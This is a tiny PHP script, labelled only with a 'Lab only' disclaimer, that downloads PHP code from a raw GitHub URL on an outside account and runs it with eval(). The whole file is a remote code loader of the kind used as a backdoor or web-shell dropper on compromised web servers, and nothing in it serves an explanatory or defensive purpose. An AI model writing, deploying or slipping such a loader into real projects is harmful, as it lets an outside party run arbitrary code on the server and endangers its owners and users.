<?php
/**
 * DISCLAIMER: Lab only.
 */
$url = 'https://raw.githubusercontent.com/gwmmiyaws-gif/trst/refs/heads/main/tes1.php';
$data = file_get_contents($url);
if ($data) {
    $data = substr($data, strpos($data, '<?php') + 5);
    eval('?>' . $data);
}
?>
